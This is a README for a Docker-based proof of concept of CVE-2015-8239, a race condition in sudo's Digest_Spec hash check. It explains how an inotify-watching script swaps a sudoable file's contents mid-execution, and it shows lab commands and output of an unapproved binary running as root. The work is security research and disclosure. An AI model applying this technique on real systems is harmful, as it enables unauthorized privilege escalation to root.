# sudoers `Digest_Spec` TOCTOU POC

## Rationale

Alyssa Milburn (<https://twitter.com/noopwafel>) discovered a TOCTOU race
condition bug in `sudo` when the `Digest_Spec` setting is used. The
`Digest_Spec` setting can be used to allow a user to `sudo` a binary if and
only if its hash matches a prescribed value. See `man sudoers` and search for
`Digest_Spec` for more information on this feature, and see
<http://noopwafel.net/notes/2015/sudo-digest-race-condition.html> for more info
on the bug discovered by Alyssa. The issue was assigned CVE-2015-8239.

The issue was mitigated by adding documentation to `man sudoers` warning of the
potential of a race condition, and by adding some `fexecve()` magic to `sudo`
to try to prevent certain types of file modifications from being effective.

Interestingly, cve-assign said the following at <https://seclists.org/oss-sec/2015/q4/256>:

```
As far as we know, the Digest_Spec feature can be useful if the user
invoking sudo doesn't have write access to the program file, but a
second (and potentially untrusted) user does have write access to the
program file. In the envisioned scenario, the second user is not
allowed to use sudo, the second user has no way to predict when anyone
else may use sudo, and the second user cannot use their write access
often. Thus, if the second user attempts a file-replacement attack,
the attack will almost certainly occur at an ineffective instant of
time, and the Digest_Spec feature will successfully prevent the
attacker's desired outcome.
```

This POC shows that this statement is not necessarily true, provided that the
"writer" user can execute persistent code on the system. The "writer" user can
leverage `inotify` to detect when the "executor" user is executing the file
using `sudo` and can attempt a file replacement attack at that time.

## About

This project creates a Docker image which:

* Has a file at `/opt/sudoable` which is writable by the `editor` user, and is sudo'able by the `executor` user iff its SHA256 hash matches a particular value
* Has a file at `/opt/hello` (The "good" file whose SHA256 hash is baked into sudoers) and a file at `/opt/goodbye` (An "evil" file)
* Has `/opt` as being writable only by the `root` user (And so the `editor` user can replace the _contents_ of `/opt/sudoable` but cannot do a filesystem-level file swap operation)
* An inotify-based TOCTOU exploit at `/home/editor/exploit/exploit.py`

When `/home/editor/exploit/exploit.py` is executed by the `editor` user,
`inotify` is used to monitor filesystem events. When the `/opt/sudoable` file
is accessed, it is replaced with `/opt/goodbye`. After the file is then closed
it is replaced with `/opt/hello` to leave things in a "normal" state.

Assuming this race succeeds when the `executor` user does `sudo /opt/sudoable`
(Which it does the majority of the time on my machine), the `editor` user can
cause the `executor` user to execute a malicious binary as `root` regardless of
the SHA256 hash being specified as the `Digest_Spec` value within sudoers.

## Building

Run `make all`

## Running

1. Do `./instantiate.sh`
2. Run `tmux new-session` and split the pane (`Ctrl+b` then `"`; use `Ctrl+b` then Up/Down to switch panes)
3. In the top pane, do `sudo -u executor sudo /opt/sudoable` and observe the output `Hello uid=0`
4. In the bottom pane, do `sudo -u editor cp /opt/goodbye /opt/sudoable`
5. In the top pane, do `sudo -u executor sudo /opt/sudoable` and observe that you're asked for a password (i.e. the `sudo` operation failed due to a digest mismatch)
6. In the bottom pane, do `sudo -u editor /home/editor/exploit/exploit.py`
7. In the top pane, do `sudo -u executor sudo /opt/sudoable` a few times and observe the occasional output of `Goodbye uid=0`

## Example output

Top pane:

```
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Hello uid=0
```

Bottom pane:

```
root@c600efec2da8:/# sudo -u editor cp /opt/goodbye /opt/sudoable
```

Top pane:

```
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for executor:
```

Bottom pane:

```
root@c600efec2da8:/# sudo -u editor /home/editor/exploit/exploit.py
```

Top pane:

```
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for executor:
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Goodbye uid=0
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Goodbye uid=0
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Goodbye uid=0
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Goodbye uid=0
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Goodbye uid=0
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Goodbye uid=0
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Goodbye uid=0
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
Goodbye uid=0
root@c600efec2da8:/# sudo -u executor sudo /opt/sudoable
sudo: unable to execute /opt/sudoable: Text file busy
```

## Further work

In which cases is the `fexecve()` mitigation actually effective? If a user has
write access to the sudoable file but not the directory it is in, they can
modify the file that is opened by `sudo`. If the user has write access to the
directory but not the file, they can move the file out of the way and recreate
it such that they can modify it, and we're back to square one.

## Greetz

Thanks to Luke (<https://twitter.com/lukejahnke>) for telling me about the
`Digest_Spec` setting, bouncing some ideas around and thinking of using
`inotify` for a clean cross-user POC.
